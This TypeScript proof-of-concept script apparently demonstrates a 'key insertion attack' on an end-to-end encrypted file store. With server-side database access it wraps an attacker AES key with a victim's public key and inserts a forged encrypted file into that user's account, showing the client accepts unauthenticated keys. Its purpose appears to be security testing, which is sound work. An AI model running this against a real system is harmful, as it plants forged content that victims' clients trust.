import { db } from '../src/db/index';
import { users, files } from '../src/db/schema';
import { eq } from 'drizzle-orm';
import { randomUUID } from 'node:crypto';
import fs from 'node:fs/promises';
import path from 'node:path';
import { webcrypto } from 'node:crypto';

// Polyfill btoa/atob if needed
if (typeof btoa === 'undefined') {
  global.btoa = (str: string) => Buffer.from(str, 'binary').toString('base64');
}
if (typeof atob === 'undefined') {
  global.atob = (b64: string) => Buffer.from(b64, 'base64').toString('binary');
}

function arrayBufferToBase64(data: ArrayBuffer): string {
  return Buffer.from(data).toString('base64');
}

function base64ToArrayBuffer(base64: string): ArrayBuffer {
  const buf = Buffer.from(base64, 'base64');
  return buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
}

async function run() {
  console.log('--- Simulating Key Insertion Attack ---');

  // 1. Get a victim user
  const allUsers = await db.select().from(users).limit(1);
  if (allUsers.length === 0) {
    console.error('No users found in database to attack. Please register a user first.');
    return;
  }
  const victim = allUsers[0];
  console.log(`[+] Found victim: ${victim.username} (ID: ${victim.id})`);

  if (!victim.encryptionPublicKeyPem) {
    console.error('Victim has no encryption public key.');
    return;
  }

  // 2. Import victim's public key for wrapping
  console.log('[+] Importing victim public key...');
  const pemHeader = '-----BEGIN PUBLIC KEY-----';
  const pemFooter = '-----END PUBLIC KEY-----';
  const pemContents = victim.encryptionPublicKeyPem.replace(pemHeader, '').replace(pemFooter, '').replace(/\s/g, '');
  const binaryDer = base64ToArrayBuffer(pemContents);
  
  const publicKey = await webcrypto.subtle.importKey(
    'spki',
    binaryDer,
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    true,
    ['encrypt']
  );

  // 3. Generate attacker's AES-GCM key
  console.log('[+] Generating attacker AES-GCM key...');
  const attackerKey = await webcrypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,
    ['encrypt', 'decrypt']
  );

  // 4. Wrap the attacker's key with victim's public key (The Attack)
  console.log('[+] Wrapping attacker key with victim public key (No authentication!)...');
  const exportedAttackerKey = await webcrypto.subtle.exportKey('raw', attackerKey);
  const wrappedKeyBuf = await webcrypto.subtle.encrypt(
    { name: 'RSA-OAEP' },
    publicKey,
    exportedAttackerKey
  );
  const wrappedKey = arrayBufferToBase64(wrappedKeyBuf);

  // 5. Encrypt malicious file content
  console.log('[+] Encrypting malicious payload...');
  const payload = 'YOU HAVE BEEN HACKED BY KEY INSERTION ATTACK!\n\nThis file was inserted by a malicious server using an attacker-controlled AES key wrapped with your public key.';
  const payloadBytes = new TextEncoder().encode(payload);
  const fileIv = webcrypto.getRandomValues(new Uint8Array(12));
  const encryptedFileBuf = await webcrypto.subtle.encrypt(
    { name: 'AES-GCM', iv: fileIv },
    attackerKey,
    payloadBytes
  );

  // 6. Encrypt filename
  console.log('[+] Encrypting filename...');
  const filenameStr = 'hacked_by_server.txt';
  const filenameIv = webcrypto.getRandomValues(new Uint8Array(12));
  const filenameBytes = new TextEncoder().encode(filenameStr);
  const encryptedFilenameBuf = await webcrypto.subtle.encrypt(
    { name: 'AES-GCM', iv: filenameIv },
    attackerKey,
    filenameBytes
  );
  const encryptedFilename = JSON.stringify({
    c: arrayBufferToBase64(encryptedFilenameBuf),
    n: arrayBufferToBase64(filenameIv)
  });

  // 7. Write encrypted file to disk
  const fileId = randomUUID();
  const storagePath = path.join(process.cwd(), 'uploads', fileId);
  await fs.writeFile(storagePath, Buffer.from(encryptedFileBuf));
  console.log(`[+] Wrote encrypted payload to ${storagePath}`);

  // 8. Insert into database
  console.log('[+] Inserting malicious file record into database...');
  await db.insert(files).values({
    id: fileId,
    uid: randomUUID().substring(0, 8),
    filename: encryptedFilename,
    ownerId: victim.id,
    encryptedKey: wrappedKey,
    iv: arrayBufferToBase64(fileIv),
    storagePath: storagePath,
    fileSize: payloadBytes.length,
    isFolder: false,
    parentId: null,
  });

  console.log('--- Attack Complete ---');
  console.log(`Malicious file has been successfully inserted into ${victim.username}'s account.`);
  console.log('If the user logs in, the client will blindly accept the unauthenticated wrapped key, unwrap it, and decrypt the malicious file without errors.');
}

run().catch(console.error);
